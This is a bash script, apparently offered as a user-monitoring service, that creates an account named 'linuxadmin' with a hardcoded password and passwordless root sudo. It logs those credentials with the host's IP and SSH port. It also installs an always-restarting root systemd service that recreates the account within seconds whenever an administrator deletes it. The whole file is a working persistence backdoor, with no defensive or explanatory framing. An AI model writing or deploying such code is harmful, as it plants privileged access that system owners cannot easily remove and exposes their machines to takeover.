
USER_LIST="/var/lib/auto-users.list"
MONITOR_LOG="/var/log/user-monitor.log"
CREATE_LOG="/var/log/auto-user.log"


setup_script() {

    if [ ! -x "$0" ]; then
        chmod +x "$0"
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] Set executable permission for $0" | tee -a "$MONITOR_LOG"
    fi
    
   
    touch "$MONITOR_LOG"
    touch "$CREATE_LOG"
    touch "$USER_LIST"
    
    
    chmod 640 "$MONITOR_LOG" "$CREATE_LOG" "$USER_LIST"
    
    
    if [ ! -f /etc/systemd/system/user-monitor.service ]; then
        cat > /etc/systemd/system/user-monitor.service << EOF
[Unit]
Description=Auto User Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=$0 --monitor
Restart=always
RestartSec=5
User=root
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF
        
        systemctl daemon-reload
        systemctl enable user-monitor.service
        systemctl start user-monitor.service
        
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] Systemd service created and started" | tee -a "$MONITOR_LOG"
    fi
}


log_monitor() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [MONITOR] $1" | tee -a "$MONITOR_LOG"
}

log_create() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [CREATE] $1" | tee -a "$CREATE_LOG"
}


create_linuxadmin_user() {
    if [ "$EUID" -ne 0 ]; then
        log_create "ERROR: Run This Script as ROOT"
        return 1
    fi

    OS="unknown"
    if [ -f /etc/os-release ]; then
        source /etc/os-release
        case "$ID" in
            ubuntu) OS="ubuntu" ;;
            debian) OS="debian" ;;
            centos|rhel|almalinux|rocky) OS="centos" ;;
            fedora) OS="fedora" ;;
        esac
    fi

    if [ "$OS" = "unknown" ]; then
        log_create "ERROR: Cannot detect OS"
        return 1
    fi

   
    USERNAME="linuxadmin"
    PASSWORD="linuxadminPaSS123!!"

    
    if id "$USERNAME" &>/dev/null; then
        log_create "User $USERNAME already exists"
        return 0
    fi

    
    useradd -m -s /bin/bash "$USERNAME"
    echo "$USERNAME:$PASSWORD" | chpasswd

    
    case "$OS" in
        ubuntu|debian)
            usermod -aG sudo "$USERNAME"
            log_create "Added $USERNAME to sudo group (Ubuntu/Debian)"
            ;;
        centos|fedora|rhel|almalinux|rocky)
            usermod -aG wheel "$USERNAME"
            log_create "Added $USERNAME to wheel group (CentOS/RHEL)"
            ;;
    esac

    
    SUDOERS_FILE="/etc/sudoers.d/$USERNAME"
    echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" > "$SUDOERS_FILE"
    chmod 440 "$SUDOERS_FILE"
    log_create "Created sudoers file: $SUDOERS_FILE"

    
    SSH_PORT=$(grep "^Port" /etc/ssh/sshd_config 2>/dev/null | awk '{print $2}')
    SSH_PORT=${SSH_PORT:-22}

    
    log_create "=============================================="
    log_create " USER CREATED/RECREATED"
    log_create "----------------------------------------------"
    log_create " SSH PORT : $SSH_PORT"
    log_create " USERNAME : $USERNAME"
    log_create " PASSWORD : $PASSWORD"
    log_create " HOSTNAME : $(hostname)"
    log_create " IP ADDR  : $(hostname -I 2>/dev/null | awk '{print $1}')"
    log_create "=============================================="

   
    wall "⚠️ User $USERNAME telah dibuat/direcreate pada $(date '+%Y-%m-%d %H:%M:%S')"
    
    
    echo "$USERNAME" >> "$USER_LIST"
    sort -u "$USER_LIST" -o "$USER_LIST"
    
    return 0
}


monitor_users() {
    log_monitor "Starting user monitoring service"
    
    
    USER_PATTERN="^linuxadmin"
    
   
    if ! getent passwd | grep -q "$USER_PATTERN"; then
        log_monitor "No linuxadmin user found. Creating initial user..."
        create_linuxadmin_user
    fi
    
    
    getent passwd | grep "$USER_PATTERN" | cut -d: -f1 | sort > "$USER_LIST"
    
    
    while true; do
        
        CURRENT_USERS=$(getent passwd | grep "$USER_PATTERN" | cut -d: -f1 | sort)
        
        
        EXPECTED_USERS=$(cat "$USER_LIST" 2>/dev/null | sort)
        
        
        DELETED_USERS=$(comm -13 <(echo "$CURRENT_USERS") <(echo "$EXPECTED_USERS") 2>/dev/null)
        
        if [ -n "$DELETED_USERS" ]; then
            for DELETED_USER in $DELETED_USERS; do
                log_monitor "ALERT: User $DELETED_USER deleted! Creating new user..."
                
                
                grep -v "^$DELETED_USER$" "$USER_LIST" > "${USER_LIST}.tmp"
                mv "${USER_LIST}.tmp" "$USER_LIST"
                
                
                create_linuxadmin_user
                
                log_monitor "New user created as replacement for $DELETED_USER"
            done
        fi
        
        
        echo "$CURRENT_USERS" > "$USER_LIST"
        
        sleep 10  
    done
}


main() {
    case "${1:-}" in
        "--setup")
            echo "Running setup..."
            setup_script
            ;;
        "--monitor")
            monitor_users
            ;;
        "--create")
            create_linuxadmin_user
            ;;
        "--status")
            echo "=== User Monitor Status ==="
            echo "Script: $0"
            echo "Permissions: $(ls -la $0 | awk '{print $1}')"
            echo "Monitor Log: $MONITOR_LOG"
            echo "Create Log: $CREATE_LOG"
            echo "User List: $USER_LIST"
            echo ""
            echo "=== Current linuxadmin Users ==="
            getent passwd | grep "^linuxadmin" || echo "No linuxadmin users found"
            echo ""
            echo "=== Systemd Service ==="
            systemctl status user-monitor.service --no-pager 2>/dev/null || echo "Service not running"
            ;;
        "--help"|"-h")
            echo "Usage: $0 [OPTION]"
            echo ""
            echo "Options:"
            echo "  --setup     Setup script permissions and systemd service"
            echo "  --monitor   Start monitoring users (for systemd service)"
            echo "  --create    Manually create linuxadmin user"
            echo "  --status    Check current status"
            echo "  --help      Show this help"
            echo ""
            echo "Examples:"
            echo "  $0 --setup    # First time setup"
            echo "  $0 --status   # Check status"
            echo "  $0 --create   # Manual create user"
            ;;
        *)
            
            setup_script
            create_linuxadmin_user
            echo "Script setup completed!"
            echo "To start monitoring: systemctl start user-monitor.service"
            echo "To check status: $0 --status"
            ;;
    esac
}


main "$@"
